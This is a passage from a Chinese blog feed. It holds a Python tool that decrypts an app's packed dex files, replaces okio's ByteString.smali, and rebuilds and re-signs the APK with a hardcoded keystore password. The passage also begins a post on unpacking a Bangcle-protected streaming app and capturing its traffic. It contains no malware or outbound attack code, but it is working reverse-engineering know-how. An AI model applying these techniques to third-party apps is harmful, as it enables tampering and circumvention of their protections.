class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BufferedReader, BufferedRandom</span><br><span class="line"><span class="keyword">from</span> zipfile <span class="keyword">import</span> ZipFile</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> click</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QC</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, apk, work_dir, key, out=<span class="literal">None</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        param:</span></span><br><span class="line"><span class="string">            apk: apk path to modify</span></span><br><span class="line"><span class="string">            dir: work dir to save files in the process</span></span><br><span class="line"><span class="string">            key: the aes ecb key to de/en-crypt dex</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># files paths</span></span><br><span class="line">        self.work_path = self.clean_path(work_dir + <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        self.unzip_apk_path = self.clean_path(os.path.join(work_dir, os.path.basename(apk)[:-<span class="number">4</span>]))</span><br><span class="line">        <span class="comment"># The encrypted dex splited from apk</span></span><br><span class="line">        self.original_path = self.clean_path(os.path.join(work_dir, <span class="string">&#x27;original/&#x27;</span>))</span><br><span class="line">        <span class="comment"># The decrypted dex from original encrypted dex</span></span><br><span class="line">        self.decrypted_path = self.clean_path(os.path.join(work_dir, <span class="string">&#x27;decrypted/&#x27;</span>))</span><br><span class="line">        <span class="comment"># The smali files baksmali from decrypted dex</span></span><br><span class="line">        self.baksmali_path = os.path.join(work_dir, <span class="string">&#x27;baksmali/&#x27;</span>)</span><br><span class="line">        <span class="comment"># The dex from modified smali files</span></span><br><span class="line">        self.updated_path = os.path.join(work_dir, <span class="string">&#x27;updated/&#x27;</span>)</span><br><span class="line">        <span class="comment"># The encrypted dex from updated dex</span></span><br><span class="line">        self.encrypted_path = self.clean_path(os.path.join(work_dir, <span class="string">&#x27;encrypted/&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># unzip apk</span></span><br><span class="line">        logging.info(<span class="string">&#x27;Start Unpack apk&#x27;</span>)</span><br><span class="line">        <span class="comment"># shutil.unpack_archive(apk, self.unzip_apk_path, &#x27;zip&#x27;)</span></span><br><span class="line">        self.qcapk = ZipFile(apk, mode=<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        self.qcapk.extract(<span class="string">&quot;classes.dex&quot;</span>, path=self.unzip_apk_path)</span><br><span class="line">        self.classes_path = os.path.join(self.unzip_apk_path, <span class="string">&#x27;classes.dex&#x27;</span>)</span><br><span class="line">        self.dex_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># en/de-crypt</span></span><br><span class="line">        self.key = key.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># output</span></span><br><span class="line">        self.outapk = self.work_path + out + <span class="string">&#x27;.apk&#x27;</span></span><br><span class="line">        self.outzip = self.work_path + out + <span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">        shutil.copyfile(apk, self.outzip)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">clean_path</span>(<span class="params">p</span>):</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(p):</span><br><span class="line">            shutil.rmtree(p)</span><br><span class="line">        os.mkdir(p)</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checksum</span>(<span class="params">dexf: BufferedRandom</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Update checksum of dex file</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        param:</span></span><br><span class="line"><span class="string">            dexf: the file-object of dex file</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        dexf.seek(<span class="number">8</span>)</span><br><span class="line">        sourceData = dexf.read(<span class="number">4</span>)</span><br><span class="line">        dexf.seek(<span class="number">12</span>)</span><br><span class="line">        checkdata = dexf.read()</span><br><span class="line">        checksum = zlib.adler32(checkdata)</span><br><span class="line">        checkBytes = (checksum &amp; <span class="number">0xffffffff</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        logging.info(<span class="string">&quot;checksum: &quot;</span> + sourceData.<span class="built_in">hex</span>() + <span class="string">&quot; -&gt; &quot;</span> + checkBytes.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="keyword">if</span> dexf.writable <span class="keyword">and</span> sourceData != checkBytes:</span><br><span class="line">            dexf.seek(<span class="number">8</span>)</span><br><span class="line">            dexf.write(checkBytes)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">signature</span>(<span class="params">dexf: BufferedRandom</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Update signature of dex file</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        param:</span></span><br><span class="line"><span class="string">            dexf: the file-object of dex file</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        dexf.seek(<span class="number">12</span>)</span><br><span class="line">        sourceData = dexf.read(<span class="number">20</span>)</span><br><span class="line">        dexf.seek(<span class="number">32</span>)</span><br><span class="line">        sigdata = dexf.read()</span><br><span class="line">        sha1 = hashlib.sha1()</span><br><span class="line">        sha1.update(sigdata)</span><br><span class="line">        sha2 = sha1.digest()</span><br><span class="line">        logging.info(<span class="string">&quot;signature: &quot;</span> + sourceData.<span class="built_in">hex</span>() + <span class="string">&quot; -&gt; &quot;</span> + sha2.<span class="built_in">hex</span>())</span><br><span class="line">        <span class="keyword">if</span> dexf.writable <span class="keyword">and</span> sourceData != sha2:</span><br><span class="line">            dexf.seek(<span class="number">12</span>)</span><br><span class="line">            dexf.write(sha2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">splitdex</span>(<span class="params">self, dexf: BufferedReader</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Split original classes.dex file</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        param:</span></span><br><span class="line"><span class="string">            dexf: the file-object of dex file</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        dexf.seek(<span class="number">0x20</span>)</span><br><span class="line">        length = <span class="built_in">int</span>.from_bytes(dexf.read(<span class="number">4</span>), byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        dexf.seek(length - <span class="number">4</span>)</span><br><span class="line">        index_length = <span class="built_in">int</span>.from_bytes(dexf.read(<span class="number">4</span>), byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        dexf.seek(length - <span class="number">4</span> - index_length)</span><br><span class="line">        _tmp = dexf.read(index_length).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        info = <span class="string">&quot;&quot;</span>.join(_tmp[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(_tmp), <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">for</span> di <span class="keyword">in</span> info.split(<span class="string">&#x27;-&#x27;</span>):</span><br><span class="line">            self.dex_dict[di.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>]] = <span class="built_in">int</span>(di.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">        <span class="comment"># dex_start is the start of inject data</span></span><br><span class="line">        dex_start = length - <span class="number">4</span> - index_length</span><br><span class="line">        <span class="keyword">for</span> dex_name <span class="keyword">in</span> self.dex_dict:</span><br><span class="line">            dex_length = self.dex_dict[dex_name]</span><br><span class="line">            dex_start = dex_start - dex_length</span><br><span class="line">        <span class="comment"># get the shell dex</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(self.original_path + <span class="string">&#x27;shell.dex&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> sf:</span><br><span class="line">            dexf.seek(<span class="number">0</span>)</span><br><span class="line">            sf.write(dexf.read(dex_start))</span><br><span class="line">        <span class="comment"># get resume dex</span></span><br><span class="line">        <span class="keyword">for</span> dex_name <span class="keyword">in</span> self.dex_dict:</span><br><span class="line">            dex_length = self.dex_dict[dex_name]</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(self.original_path + dex_name, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> cf:</span><br><span class="line">                dexf.seek(dex_start)</span><br><span class="line">                cf.write(dexf.read(dex_length))</span><br><span class="line">                dex_start = dex_start + dex_length</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decdex</span>(<span class="params">self, dex_name: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Decrypt dex</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        param:</span></span><br><span class="line"><span class="string">            the dex name to be dec</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(self.original_path + dex_name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> e:</span><br><span class="line">            bencdata = e.read()</span><br><span class="line">            decryptor = Cipher(algorithms.AES(self.key), modes.ECB()).decryptor()</span><br><span class="line">            dexraw = decryptor.update(bencdata) + decryptor.finalize()</span><br><span class="line">            unpadder = padding.PKCS7(<span class="number">128</span>).unpadder()</span><br><span class="line">            bdecdex = unpadder.update(dexraw) + unpadder.finalize()</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(self.decrypted_path + dex_name, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> d:</span><br><span class="line">                d.write(bdecdex)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encdex</span>(<span class="params">self, dex_name: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Encrypt dex</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        param:</span></span><br><span class="line"><span class="string">            the dex name to be enc</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(self.updated_path + dex_name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> e:</span><br><span class="line">            bdecdata = e.read()</span><br><span class="line">            padder = padding.PKCS7(<span class="number">128</span>).padder()</span><br><span class="line">            bpaddata = padder.update(bdecdata) + padder.finalize()</span><br><span class="line">            encryptor = Cipher(algorithms.AES(self.key), modes.ECB()).encryptor()</span><br><span class="line">            bencdex = encryptor.update(bpaddata) + encryptor.finalize()</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(self.encrypted_path + dex_name, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> d:</span><br><span class="line">                <span class="keyword">return</span> d.write(bencdex)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">repdex</span>(<span class="params">self, dex_path, dex_name</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Repair signature and checksum of dex</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        param:</span></span><br><span class="line"><span class="string">            dex_path: the dex path</span></span><br><span class="line"><span class="string">            dex_name: the dex name</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        logging.info(<span class="string">f&#x27;Start Repair <span class="subst">&#123;dex_path + dex_name&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(dex_path + dex_name, <span class="string">&#x27;r+b&#x27;</span>) <span class="keyword">as</span> dexf:</span><br><span class="line">            self.signature(dexf)</span><br><span class="line">            self.checksum(dexf)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">baksmali</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        apply baksmali.jar, from decrypted_path to baksmali_path</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        dec_name = self.work_path + <span class="string">&#x27;decrypted&#x27;</span></span><br><span class="line">        shutil.make_archive(dec_name, <span class="string">&#x27;zip&#x27;</span>, self.decrypted_path)</span><br><span class="line">        os.system(<span class="string">f&#x27;java -jar bin/apktool.jar d <span class="subst">&#123;dec_name&#125;</span>.zip -o <span class="subst">&#123;self.baksmali_path&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">smali</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        apply smali.jar, from baksmali_path to updated_path</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        bak_path = self.work_path + <span class="string">&#x27;baksmali.zip&#x27;</span></span><br><span class="line">        os.system(<span class="string">f&#x27;java -jar bin/apktool.jar b <span class="subst">&#123;self.baksmali_path&#125;</span> -o <span class="subst">&#123;bak_path&#125;</span>&#x27;</span>)</span><br><span class="line">        shutil.unpack_archive(bak_path, self.updated_path, <span class="string">&#x27;zip&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write_out</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        merge all classes to one classes use the original encrypt type</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(self.work_path + <span class="string">&#x27;classes.dex&#x27;</span>, <span class="string">&#x27;w+b&#x27;</span>) <span class="keyword">as</span> dexf:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(self.original_path + <span class="string">&#x27;shell.dex&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> sf:</span><br><span class="line">                shell_length = dexf.write(sf.read())</span><br><span class="line">            <span class="keyword">for</span> dex_name <span class="keyword">in</span> self.dex_dict:</span><br><span class="line">                dex_length = self.encdex(dex_name)</span><br><span class="line">                self.dex_dict[dex_name] = dex_length</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(self.encrypted_path + dex_name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> df:</span><br><span class="line">                    dexf.write(df.read())</span><br><span class="line">            dex_list = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: x + <span class="string">&#x27;=&#x27;</span> + <span class="built_in">str</span>(self.dex_dict[x]), self.dex_dict)</span><br><span class="line">            dex_index = (<span class="string">&quot;.&quot;</span> + <span class="string">&quot;.&quot;</span>.join(i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;-&#x27;</span>.join(<span class="built_in">list</span>(dex_list)))).encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">            dexf.write(dex_index)</span><br><span class="line">            index_length = <span class="built_in">len</span>(dex_index).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            dexf.write(index_length)</span><br><span class="line">            dexf.seek(<span class="number">0x20</span>)</span><br><span class="line">            length = shell_length + <span class="built_in">sum</span>(self.dex_dict.values()) + <span class="built_in">len</span>(dex_index) + <span class="number">4</span></span><br><span class="line">            dexf.write(length.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">        self.repdex(self.work_path, <span class="string">&#x27;classes.dex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pack_sign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Zip and Sign</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        shutil.move(self.work_path + <span class="string">&#x27;classes.dex&#x27;</span>, <span class="string">&#x27;classes.dex&#x27;</span>)</span><br><span class="line">        logging.info(<span class="string">f&#x27;Start pack to <span class="subst">&#123;self.outapk&#125;</span>&#x27;</span>)</span><br><span class="line">        os.system(<span class="string">f&quot;bin\\7za d <span class="subst">&#123;self.outzip&#125;</span> classes.dex &gt; nul&quot;</span>)</span><br><span class="line">        os.system(<span class="string">f&quot;bin\\7za a <span class="subst">&#123;self.outzip&#125;</span> classes.dex &gt; nul&quot;</span>)</span><br><span class="line">        os.rename(self.outzip, self.outapk)</span><br><span class="line">        logging.info(<span class="string">f&#x27;Start sign <span class="subst">&#123;self.outapk&#125;</span>&#x27;</span>)</span><br><span class="line">        os.system(<span class="string">f&#x27;apksigner.bat sign --ks bin/release.jks --ks-pass pass:123456 &#x27;</span></span><br><span class="line">                  <span class="string">f&#x27;--min-sdk-version 22 <span class="subst">&#123;self.outapk&#125;</span>&#x27;</span>)</span><br><span class="line">        shutil.move(<span class="string">&#x27;classes.dex&#x27;</span>, self.work_path + <span class="string">&#x27;classes.dex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">break_dex</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        command d: splitdex + decrypt + baksmali</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(self.classes_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> cf:</span><br><span class="line">            logging.info(<span class="string">&#x27;Start Split original classes.dex&#x27;</span>)</span><br><span class="line">            self.splitdex(cf)</span><br><span class="line">        <span class="keyword">for</span> dex_name <span class="keyword">in</span> self.dex_dict:</span><br><span class="line">            logging.info(<span class="string">f&#x27;Start Decrypt <span class="subst">&#123;dex_name&#125;</span>&#x27;</span>)</span><br><span class="line">            self.decdex(dex_name)</span><br><span class="line">        logging.info(<span class="string">&#x27;Start Baksmali dex to smali&#x27;</span>)</span><br><span class="line">        self.baksmali()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">replace</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        command r: replace ByteString.smali</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> dex_name <span class="keyword">in</span> self.dex_dict:</span><br><span class="line">            BS_path = <span class="string">f&#x27;<span class="subst">&#123;self.baksmali_path&#125;</span>smali_<span class="subst">&#123;dex_name[:-<span class="number">4</span>]&#125;</span>/okio/ByteString.smali&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> os.path.exists(BS_path):</span><br><span class="line">                logging.info(<span class="string">f&#x27;Start Replace ByteString.smali of <span class="subst">&#123;dex_name&#125;</span>&#x27;</span>)</span><br><span class="line">                os.remove(BS_path)</span><br><span class="line">                shutil.copy(<span class="string">&#x27;ByteString.smali&#x27;</span>, BS_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        command b: smali + encrypt + write + pack + sign</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        logging.info(<span class="string">&#x27;Start smali.jar to convert smali to dex&#x27;</span>)</span><br><span class="line">        self.smali()</span><br><span class="line">        <span class="keyword">for</span> dex_name <span class="keyword">in</span> self.dex_dict:</span><br><span class="line">            logging.info(<span class="string">f&#x27;Start Decrypt <span class="subst">&#123;dex_name&#125;</span>&#x27;</span>)</span><br><span class="line">            self.encdex(dex_name)</span><br><span class="line">        logging.info(<span class="string">&#x27;Start write out to classes.dex&#x27;</span>)</span><br><span class="line">        self.write_out()</span><br><span class="line">        logging.info(<span class="string">&#x27;Start pack and sign the zip file&#x27;</span>)</span><br><span class="line">        self.pack_sign()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># run all</span></span><br><span class="line"><span class="meta">@click.command()</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-a&#x27;</span>, <span class="string">&#x27;--apk&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;the apk file path&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--dir&#x27;</span>, default=<span class="string">&#x27;classes&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;the work directory&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-k&#x27;</span>, <span class="string">&#x27;--key&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;the aes ecb key&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--out&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;the output apk name&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">apk, <span class="built_in">dir</span>, key, out</span>):</span><br><span class="line">    xl = QC(apk, <span class="built_in">dir</span>, key, out)</span><br><span class="line">    xl.break_dex()</span><br><span class="line">    xl.replace()</span><br><span class="line">    xl.build()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    FORMAT = <span class="string">&#x27;%(levelname)s: %(message)s&#x27;</span></span><br><span class="line">    logging.basicConfig(<span class="built_in">format</span>=FORMAT, level=logging.INFO)</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">记录 QC App 的逆向与重打包</summary>
    
    
    
    <category term="Android" scheme="https://yzctzl.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="https://yzctzl.github.io/tags/Android/"/>
    
    <category term="Flutter" scheme="https://yzctzl.github.io/tags/Flutter/"/>
    
    <category term="Smali" scheme="https://yzctzl.github.io/tags/Smali/"/>
    
  </entry>
  
  <entry>
    <title>番茄社区逆向分析</title>
    <link href="https://yzctzl.github.io/2022/tomato/"/>
    <id>https://yzctzl.github.io/2022/tomato/</id>
    <published>2022-04-15T16:00:00.000Z</published>
    <updated>2022-04-15T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>不是因为这个平台有多优秀，是因为平台的 rtmp 串流是经过某种方式加密的，没法直接观看。<br>因为 apk 加了个梆梆加固，首先脱壳。</p><h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><h3 id="关于app"><a href="#关于app" class="headerlink" title="关于app"></a>关于app</h3><p>从<a href="https://gist.github.com/priddlexljpgl38/3d5fc30487ba6878103571e689da86a9">地址发布页</a>中选个地址，更换为安卓的UA之后就能下载了。</p><h3 id="反射大师-DexInjector"><a href="#反射大师-DexInjector" class="headerlink" title="反射大师&#x2F;DexInjector"></a>反射大师&#x2F;DexInjector</h3><p>免费版的梆梆加固可以使用反射大师脱壳，更多详细资料参看 <a href="https://bbs.binmt.cc/%E3%80%82">https://bbs.binmt.cc/。</a><br>安装<code>VMOS ➕ Android5.1极客版 ➕ Xposed ➕ 反射大师</code>，这里使用的反射大师是<code>VMOS</code>用户分享的版本。<br>反射大师中长按<code>写出DEX</code>就能一次性生成数个<code>DEX</code>了。<br>通过尝试发现反射大师十个很好用的工具，对于梆梆加固和360加固的免费版，都能起到比较好的脱壳。<br>那如果用了企业版怎么办？举报！<br>最开始用的是<code>frida</code>的一些脚本，发现只要一启动脚本，该壳就会闪退，遂放弃。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/tomato/refselect.png' data-fancybox='default' data-caption='refselect.png'><img fancybox itemprop="contentUrl" src="/img/2022/tomato/refselect.png" class="lazyload" data-srcset="/img/2022/tomato/refselect.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="refselect.png"></a><span class='image-caption'>refselect.png</span></div><br><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/tomato/refstart.png' data-fancybox='default' data-caption='refstart.png'><img fancybox itemprop="contentUrl" src="/img/2022/tomato/refstart.png" class="lazyload" data-srcset="/img/2022/tomato/refstart.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="refstart.png"></a><span class='image-caption'>refstart.png</span></div><br><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/tomato/refdex.png' data-fancybox='default' data-caption='refdex.png'><img fancybox itemprop="contentUrl" src="/img/2022/tomato/refdex.png" class="lazyload" data-srcset="/img/2022/tomato/refdex.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="refdex.png"></a><span class='image-caption'>refdex.png</span></div><br><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2022/tomato/refdexdump.png' data-fancybox='default' data-caption='refdexdump.png'><img fancybox itemprop="contentUrl" src="/img/2022/tomato/refdexdump.png" class="lazyload" data-srcset="/img/2022/tomato/refdexdump.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="refdexdump.png"></a><span class='image-caption'>refdexdump.png</span></div></div><h3 id="AndroidManifest"><a href="#AndroidManifest" class="headerlink" title="AndroidManifest"></a>AndroidManifest</h3><p>加固一般情况下也会导致 <code>AndroidManifest.xml</code> 不可读。<br><a href="https://code.google.com/archive/p/android4me/downloads">AXMLPrinter2.jar</a> 这个工具会解决这个问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar AXMLPrinter2.jar 001_A007_3.4.2.1\AndroidManifest.xml &gt; tomato\AndroidManifest.xml</span><br></pre></td></tr></table></figure><h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><p>分别使用 Fiddler 和 Burp Suite 抓包。从结果上来看，tmt 的服务与 xdj 比起来显得有点不易懂。<br>最明显的是充斥着满屏的错误，各种不可访问资源请求，Error&#x2F;404 等等。<br>从这一堆垃圾中，有两个地址很显著：<code>api.zhengjianyj.com</code> 和 